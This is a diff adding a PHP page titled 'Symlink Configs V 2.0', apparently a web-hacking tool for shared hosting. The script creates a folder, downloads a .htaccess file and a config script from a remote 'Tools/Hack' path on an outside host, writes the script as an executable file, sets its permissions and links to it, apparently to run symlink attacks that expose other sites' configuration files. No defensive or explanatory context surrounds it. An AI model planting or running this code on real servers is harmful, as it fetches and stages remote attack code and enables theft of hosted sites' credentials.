@@ -1,0 +1,55 @@
+<html>
+
+<head>
+  <title>Symlink Configs</title>
+</head>
+
+<body bgcolor="#C0C0C0">
+<p align="center"><b><i><u><font color="#FFFFFF" size="5">Symlink Configs V 2.0</font></u></i></b>
+
+<?php
+
+$dir = "cihsym2";
+@mkdir($dir);
+if($dir){
+    echo "<br> $dir => Done !";
+} else {
+    echo "<br> [-] Error !";
+}
+
+    $htaccess = "http://cih-iq.org/Tools/Hack/shCiH/htaccess";
+    $file = file_get_contents($htaccess);
+    $open = fopen("cihsym2/.htaccess" , 'w');
+    fwrite($open,$file);
+    fclose($open);
+     if($open) {
+         echo "<br> [htaccess] => Done !";
+     } else {
+         echo "<br>[-] Error !";
+     }
+
+    $cof = "http://cih-iq.org/Tools/Hack/shCiH/configs.txt";
+    $file = file_get_contents($cof);
+    $open = fopen("cihsym2/sym2.cih" , 'w');
+    fwrite($open,$file);
+    fclose($open);
+     if($open) {
+         echo "<br> [config] => Done !";
+         echo "</br><a href='cihsym2/sym2.cih' target='_blank'> Go To [SYMLINK] </a>";
+     } else {
+         echo "<br>[-] Error !";
+     }
+
+    $cofp = "cihsym2/sym2.cih";
+        chmod($cofp, 0755);
+        if($cofp){
+            echo "<br>[Chmod] => Done!";
+        } else {
+            echo "<br>[-] Error chmod !";
+        }
+
+?>
+
+</body>
+
+</html>
